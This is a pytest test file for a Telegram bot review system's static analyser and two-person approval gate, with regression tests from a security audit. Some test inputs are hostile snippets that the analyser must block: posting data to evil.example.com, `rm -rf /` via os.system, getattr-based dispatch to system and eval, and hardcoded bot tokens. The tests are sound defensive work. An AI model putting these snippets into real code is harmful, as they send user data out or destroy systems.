"""Tests für :mod:`telegram_formatter.botkit.review` — Statik, Checkliste, Vier-Augen-Prinzip."""

from __future__ import annotations

from pathlib import Path

import pytest

from telegram_formatter.botkit.registry import BotRegistry
from telegram_formatter.botkit.review import (
    CHECKLIST_IDS,
    Reviewer,
    ReviewError,
    ReviewGate,
    ReviewGateError,
    ReviewLedger,
    ReviewRole,
    analyze_code,
    analyze_source,
    source_sha256,
)
from telegram_formatter.botkit.tokens import BotToken

ROOT = Path(__file__).resolve().parents[1]
SECRET = "123456789:" + "A" * 35
CLEAN_BOT = ROOT / "examples" / "own_bot" / "minimal_bot.py"
INSECURE_BOT = ROOT / "tests" / "fixtures" / "insecure_bot.py"

ALL_CHECKS = tuple(sorted(CHECKLIST_IDS))


class FakeClock:
    def __init__(self) -> None:
        self.now = 2_000.0

    def __call__(self) -> float:
        return self.now


def make_registry(bot_id: int = 123456789) -> BotRegistry:
    return BotRegistry(
        verify=lambda _secret: {
            "ok": True,
            "result": {"id": bot_id, "username": "mein_bot", "first_name": "Mein", "is_bot": True},
        },
        clock=FakeClock(),
    )


# --------------------------------------------------------------------------- #
# Statische Analyse
# --------------------------------------------------------------------------- #
def test_clean_reference_bot_has_no_findings():
    report = analyze_source(CLEAN_BOT)
    assert report.findings == [], report.as_text()
    assert report.ok is True


def test_insecure_bot_triggers_all_expected_rules():
    report = analyze_source(INSECURE_BOT)
    found = {f.rule_id for f in report.findings}
    assert found == {"BK001", "BK002", "BK003", "BK004", "BK005", "BK006", "BK007", "BK008",
                     "BK011", "BK012"}
    assert report.ok is False
    assert len(report.blocking) >= 10


def test_blockers_are_reported_with_file_and_line():
    report = analyze_source(INSECURE_BOT)
    finding = next(f for f in report.findings if f.rule_id == "BK006")
    assert finding.file.endswith("insecure_bot.py")
    assert finding.line > 0
    assert finding.severity == "blocker"


def test_telegram_api_calls_are_allowed():
    source = 'import requests\nrequests.post("https://api.telegram.org/botTOKEN/sendMessage")\n'
    report = analyze_code(source, filename="ok.py")
    assert report.ok is True


def test_dynamic_urls_are_blocked():
    """R-2: BK010 ist seit v2.4.0 ein Blocker — eine nicht prüfbare Ziel-URL
    darf nicht mehr als bloße Warnung durchgewunken werden."""
    source = "import requests\nrequests.post(url)\n"
    report = analyze_code(source, filename="dyn.py")
    assert report.ok is False
    assert {f.rule_id for f in report.findings} == {"BK010"}
    assert {f.rule_id for f in report.blocking} == {"BK010"}


def test_suppression_comment_works_and_is_visible():
    source = (
        'def handle(text: str) -> None:\n'
        '    print(text)  # botkit:allow BK011\n'
    )
    report = analyze_code(source, filename="suppressed.py")
    assert [f.rule_id for f in report.findings] == []


def test_report_text_is_human_readable():
    text = analyze_source(INSECURE_BOT).as_text()
    assert "Blocker" in text and "BK001" in text


# --------------------------------------------------------------------------- #
# Ledger & Gate
# --------------------------------------------------------------------------- #
def test_submit_blocked_code_raises():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    with pytest.raises(ReviewGateError):
        gate.submit(123456789, INSECURE_BOT)


def test_two_independent_approvals_activate_the_bot():
    registry = make_registry()
    registry.register(BotToken.parse(SECRET), owner_ref="alice")
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry)

    ticket = gate.submit(123456789, CLEAN_BOT)
    assert registry.is_approved(123456789) is False

    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    assert registry.is_approved(123456789) is False  # Vier-Augen-Prinzip!

    gate.approve(ticket.ticket_id, Reviewer("bob", ReviewRole.CONTRIBUTOR), checks=ALL_CHECKS)
    assert registry.is_approved(123456789) is True

    gate.verify(123456789, CLEAN_BOT)  # darf nicht werfen


def test_same_person_cannot_approve_twice():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    with pytest.raises(ReviewError):
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    assert len(ticket.approvals) == 1  # dieselbe Person zählt nicht doppelt


def test_maintainer_approval_is_mandatory():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("carol"), checks=ALL_CHECKS)

    assert ticket.is_approved(min_approvals=2, require_maintainer=True) is False
    with pytest.raises(ReviewGateError):
        gate.verify(123456789, CLEAN_BOT)


def test_incomplete_checklist_is_rejected():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    with pytest.raises(ReviewError):
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=("C1", "C2"))


def test_unknown_check_ids_are_rejected():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    with pytest.raises(ReviewError):
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER),
                     checks=ALL_CHECKS + ("C99",))


def test_approval_is_bound_to_the_source_hash(tmp_path):
    registry = make_registry()
    registry.register(BotToken.parse(SECRET), owner_ref="alice")
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry)
    ticket = gate.submit(123456789, CLEAN_BOT)
    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)

    modified = tmp_path / "minimal_bot.py"
    modified.write_text(Path(CLEAN_BOT).read_text(encoding="utf-8") + "\n# kleine Änderung\n",
                        encoding="utf-8")

    with pytest.raises(ReviewGateError):  # sha256 geändert -> kein Ticket
        gate.verify(123456789, modified)
    assert source_sha256(modified) != source_sha256(CLEAN_BOT)


def test_rejection_invalidates_approval():
    registry = make_registry()
    registry.register(BotToken.parse(SECRET), owner_ref="alice")
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry)
    ticket = gate.submit(123456789, CLEAN_BOT)
    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
    assert registry.is_approved(123456789) is True

    gate.reject(ticket.ticket_id, Reviewer("dave", ReviewRole.MAINTAINER),
                note="Logging-Pfad noch prüfen")
    assert registry.is_approved(123456789) is False


def test_decision_must_match_the_ticket_hash():
    ledger = ReviewLedger(clock=FakeClock())
    ticket = ledger.submit(123456789, "a" * 64)
    other = Reviewer("alice", ReviewRole.MAINTAINER)
    from telegram_formatter.botkit.review import ReviewDecision

    with pytest.raises(ReviewError):
        ledger.decide(ticket.ticket_id,
                      ReviewDecision(other, True, ALL_CHECKS, "", 1.0, "b" * 64))


def test_ledger_roundtrip_contains_metadata_only(tmp_path):
    from telegram_formatter.botkit.review import ReviewDecision

    ledger = ReviewLedger(clock=FakeClock())
    ticket = ledger.submit(123456789, "c" * 64, file="bot.py", static_findings=["BK010@3"])
    ledger.decide(ticket.ticket_id,
                  ReviewDecision(Reviewer("alice", ReviewRole.MAINTAINER), True, ALL_CHECKS,
                                 "ok", 2_000.0, "c" * 64))

    path = tmp_path / "reviews.json"
    ledger.save(path)
    restored = ReviewLedger.load(path)

    trail = restored.audit_trail()
    assert len(trail) == 1
    assert trail[0]["source_sha256"] == "c" * 64
    assert trail[0]["decisions"][0]["reviewer"] == "alice"
    assert trail[0]["decisions"][0]["role"] == "maintainer"
    assert "text" not in path.read_text(encoding="utf-8")  # keine Inhalte im Trail


def test_load_missing_ledger_returns_empty(tmp_path):
    assert ReviewLedger.load(tmp_path / "nicht-da.json").audit_trail() == []


def test_unknown_ticket_raises():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    with pytest.raises(ReviewError):
        gate.approve("RV-UNKNOWN", Reviewer("alice"), checks=ALL_CHECKS)


def test_local_mode_without_registry():
    """Git-/CLI-Modus: Ledger ist autoritativ, Registry-Prüfungen entfallen."""
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
    ticket = gate.submit(123456789, CLEAN_BOT)
    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
    gate.verify(123456789, CLEAN_BOT)  # kein Registry-Fehler, weil registry=None


def test_invalid_reviewer_handles_are_rejected():
    for handle in ("", "x" * 65, "alice!"):
        with pytest.raises(ReviewError):
            Reviewer(handle)


# --------------------------------------------------------------------------- #
# Regressionstests aus dem Security-Audit 2026-09: die reproduzierten
# Gate-Bypasses (H-1) und das Rejection-Loch (B-3) müssen dauerhaft zu sein.
# --------------------------------------------------------------------------- #
class TestAuditBypassRegressions:
    def test_requests_alias_with_constant_url_is_blocked(self):
        """H-1/D: `import requests as rq` + konstante Fremd-URL war völlig unsichtbar."""
        src = (
            "import requests as rq\n"
            'def f():\n'
            '    return rq.get("https://evil.example.com/x")\n'
        )
        rep = analyze_code(src)
        assert not rep.ok
        assert "BK004" in {f.rule_id for f in rep.findings}

    def test_variable_url_folds_module_constant(self):
        """H-1/A: URL in Modul-Konstante — jetzt gefaltet und blockiert."""
        src = (
            "import requests\n"
            'EXFIL = "https://evil.example.com/collect"\n'
            'def leak(data):\n'
            "    requests.post(EXFIL, json=data)\n"
        )
        rep = analyze_code(src)
        assert not rep.ok
        assert "BK004" in {f.rule_id for f in rep.findings}

    def test_fstring_constant_prefix_resolves(self):
        """H-1/E: f"https://evil/{path}" — konstanter Kopf reicht für BK004."""
        rep = analyze_code(
            'import requests\nrequests.post(f"https://evil.example.com/{p}", json=d)\n'
        )
        assert "BK004" in {f.rule_id for f in rep.findings}

    def test_legit_api_base_fstring_stays_clean(self):
        """Gegentest: der minimale Referenz-Bot nutzt genau dieses Muster."""
        src = (
            "import requests\n"
            'API_BASE = "https://api.telegram.org"\n'
            'def call(token, method, payload):\n'
            '    requests.post(f"{API_BASE}/bot{token}/{method}", json=payload)\n'
        )
        # API_BASE bekannt -> nur der "{token}"-Teil ist dynamisch; das
        # Ergebnis darf kein BK004 sein.
        rep = analyze_code(src)
        assert "BK004" not in {f.rule_id for f in rep.findings}

    def test_importlib_and_tempfile_blocked(self):
        """H-1/B: Reflektion + temporäre Persistenz."""
        rep = analyze_code('import importlib\nm = importlib.import_module("os")\nm.system("ls")\n')
        assert "BK001" in {f.rule_id for f in rep.findings}
        rep = analyze_code("import tempfile\ntempfile.mkdtemp()\n")
        assert "BK001" in {f.rule_id for f in rep.findings}
        rep = analyze_code("from importlib import import_module\n")
        assert "BK001" in {f.rule_id for f in rep.findings}

    def test_annassign_and_dict_token_literals_blocked(self):
        """H-1/C: Token jenseits von ast.Assign."""
        rep = analyze_code('API_TOKEN: str = "123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"\n')
        assert "BK006" in {f.rule_id for f in rep.findings}
        rep = analyze_code('CFG = {"key": "123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"}\n')
        assert "BK006" in {f.rule_id for f in rep.findings}
        rep = analyze_code('configure(token="123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345")\n')
        assert "BK006" in {f.rule_id for f in rep.findings}

    def test_from_os_system_blocked(self):
        """H-1: `from os import system` + Naked-Call."""
        rep = analyze_code('from os import system\nsystem("rm -rf /")\n')
        assert "BK007" in {f.rule_id for f in rep.findings}

    def test_fixture_covers_new_detectors(self):
        """Das Negativbeispiel muss alle neuen Umgehungs-Muster feuern."""
        from pathlib import Path as _P
        rep = analyze_source(_P("tests/fixtures/insecure_bot.py"))
        assert rep.ok is False

    def test_rejection_blocks_verify_in_local_mode(self):
        """B-3: reject() musste den Gate auch ohne Registry schließen."""
        gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
        ticket = gate.submit(42, CLEAN_BOT)
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
        gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
        gate.verify(42, CLEAN_BOT, check_registry=False)  # Zwischenschritt: frei

        gate.reject(ticket.ticket_id, Reviewer("carol"), note="Doch nicht ok")
        import pytest as _pt
        with _pt.raises(ReviewGateError):
            gate.verify(42, CLEAN_BOT, check_registry=False)

    def test_os_open_write_descriptor_persistence_blocked(self):
        """R-2: Persistenz über Deskriptoren (os.open + os.write) statt Dateinamen."""
        rep = analyze_code(
            "import os\n"
            "fd = os.open('/tmp/x', os.O_WRONLY | os.O_CREAT)\n"
            "os.write(fd, b'x')\n"
        )
        assert "BK002" in {f.rule_id for f in rep.findings}

    def test_getattr_dispatch_blocked(self):
        """R-2: indirekter Dispatch über getattr(obj, \"name\")(…)."""
        rep = analyze_code('import os\ngetattr(os, "system")("id")\n')
        assert "BK007" in {f.rule_id for f in rep.findings}
        rep = analyze_code('getattr(__builtins__, "eval")("1+1")\n')
        assert "BK003" in {f.rule_id for f in rep.findings}

    def test_readonly_os_open_is_allowed(self):
        """Gegentest: os.open ohne Schreib-Flags ist keine Persistenz."""
        rep = analyze_code('import os\nfd = os.open("/tmp/x", os.O_RDONLY)\n')
        assert "BK002" not in {f.rule_id for f in rep.findings}

    def test_legit_api_base_fstring_has_no_findings(self):
        """Gegentest: f-string mit bekannter API-Basis-Konstante bleibt sauber."""
        rep = analyze_code(
            "import requests\n"
            'API_BASE = "https://api.telegram.org"\n'
            'requests.post(f"{API_BASE}/bot{token}/sendMessage", json=d)\n'
        )
        assert "BK004" not in {f.rule_id for f in rep.findings}
        assert "BK010" not in {f.rule_id for f in rep.findings}

    def test_resubmission_after_reject_opens_new_ticket(self):
        """Aufhebungspfad: gleiches Ticket bleibt abgelehnt, Re-Submit erzeugt ein neues."""
        gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
        old = gate.submit(42, CLEAN_BOT)
        gate.approve(old.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
        gate.reject(old.ticket_id, Reviewer("carol"), note="nein")
        fresh = gate.submit(42, CLEAN_BOT)
        assert fresh.ticket_id != old.ticket_id
        assert fresh.decisions == []
